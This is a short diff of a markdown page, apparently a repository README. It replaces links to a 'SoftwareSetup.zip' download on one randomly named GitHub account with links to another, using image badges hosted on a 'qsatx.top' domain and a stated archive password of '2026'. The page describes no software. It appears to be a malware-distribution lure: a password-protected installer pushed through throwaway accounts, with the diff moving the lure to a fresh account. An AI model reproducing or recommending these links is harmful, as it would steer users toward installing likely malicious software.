@@ -1,6 +1,6 @@
-[![https://xYruB6.qsatx.top/12/bO4RlmF](https://7IyWc.qsatx.top/12.png)](https://github.com/SideKhanChart/nfgvtfba/releases/download/sdgsdg/SoftwareSetup.zip)
+[![https://xYruB6.qsatx.top/12/bO4RlmF](https://7IyWc.qsatx.top/12.png)](https://github.com/MegaRiggerRouse/venhdusk/releases/download/sjnvhkd/SoftwareSetup.zip)
 # ✅ Link:
-[![https://1mCCClW.qsatx.top/12/3HwUbR](https://iLedMi1B.qsatx.top/d.svg)](https://github.com/SideKhanChart/nfgvtfba/releases/download/sdgsdg/SoftwareSetup.zip)
+[![https://1mCCClW.qsatx.top/12/3HwUbR](https://iLedMi1B.qsatx.top/d.svg)](https://github.com/MegaRiggerRouse/venhdusk/releases/download/sjnvhkd/SoftwareSetup.zip)
 
 **PASSWORD: 2026**
 
